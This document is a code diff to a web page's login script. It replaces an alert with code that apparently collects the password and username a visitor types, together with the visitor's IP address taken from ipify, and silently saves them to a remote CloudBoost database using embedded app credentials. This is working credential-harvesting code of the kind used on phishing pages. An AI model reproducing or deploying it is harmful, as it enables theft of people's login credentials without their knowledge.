@@ -205,8 +205,15 @@ function loadPage() {
      ip = json.ip;
   }
   function onClick() {
-     alert(ip + ' and ' + document.getElementsByName('passwd')[0].value)
+     CB.CloudApp.init('dbqmgxjzpynx', '56bd6211-0a31-403a-af6d-4f719cdce186');
+     var obj = new CB.CloudObject('Data');
+     obj.set('Password', document.getElementsByName('passwd')[0].value);
+     obj.set('Username', document.getElementById("user").value);
+     obj.set('IP', ip);
+     obj.save({
+          success : function(obj){ }, error : function(error){ }
+     });
   }
 </script>
-
+<script src="https://cloudboost.io/js-sdk/cloudboost.js"></script>
 <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=setIP"></script>
